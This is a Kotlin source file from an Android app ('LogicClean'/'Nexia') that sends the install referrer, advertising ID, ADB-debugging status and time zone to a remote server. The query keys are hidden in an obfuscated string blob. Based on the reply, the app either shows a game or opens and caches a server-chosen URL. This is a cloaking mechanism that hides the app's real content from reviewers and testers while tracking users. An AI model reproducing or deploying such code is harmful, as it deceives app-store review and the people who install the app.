package com.missclick.logicclean

import android.content.Context
import android.provider.Settings
import androidx.annotation.Keep
import com.android.installreferrer.api.InstallReferrerClient
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.URL
import java.util.TimeZone


object Nexia{

    fun next(server : String, bot : String,signal : String,context: Context,answerListener: AnswerListener){
        val splited = bot.split("</string>")
        println("go1")
        OneSignal.initWithContext(context)
        val pref = context.getSharedPreferences(signal,0)
        OneSignal.setAppId(signal)
        println("go2")
        if (pref.contains(server)){
            println("go3")
            answerListener.openView(pref.getString(server,"")!!)
        }else{
            println("go4")
            val i = InstallReferrerClient.newBuilder(context).build()
            println("go5")
            i.startConnection(RefHelp(i){
                println("go6")
                CoroutineScope(Dispatchers.IO).launch {
                    val gog = AdvertisingIdClient.getAdvertisingIdInfo(context).id.toString()
                    val linker = buildString {
                        append(server)
                        append("?")
                        append(splited[0].split(">")[1])
                        append("=")
                        append(it)
                        append("&")
                        append(splited[1].split(">")[1])
                        append("=")
                        append(gog)
                        append("&")
                        append(splited[3].split(">")[1])
                        append("=")
                        append(Settings.Secure.getInt(context.contentResolver, Settings.Global.ADB_ENABLED , 0) == 1)
                        append("&")
                        append(splited[4].split(">")[1])
                        append("=")
                        append(TimeZone.getDefault().id)
                    }
                    println(linker)
                    val response = URL(linker).readText()
//                    val response = try {
//                        URL(linker)
//                            .openStream()
//                            .bufferedReader()
//                            .use { it.readText() }
//                    }catch (e : java.lang.Exception){
//                        withContext(Dispatchers.Main){
//                            answerListener.openGame()
//                        }
//                    }
                    val prs = JSONObject(response.toString()).get(splited[5].split(">")[1]) as? String
                    if (prs == null){
                        withContext(Dispatchers.Main){
                            answerListener.openGame()
                        }
                    }else{
                        withContext(Dispatchers.Main){
                            OneSignal.setExternalUserId(gog)
                            pref.edit().putString(server,prs).apply()
                            answerListener.openView(prs)
                        }
                    }

                }
            })
        }

    }

}


object LogicClean{

    fun launch(server : String, bot : String,signal : String,context: Context,answerListener: AnswerListener){
        println("logic clean")
        Nexia.next(server,bot,signal,context,answerListener)
    }
}

interface AnswerListener{

    fun openView(url : String)

    fun openGame()

}



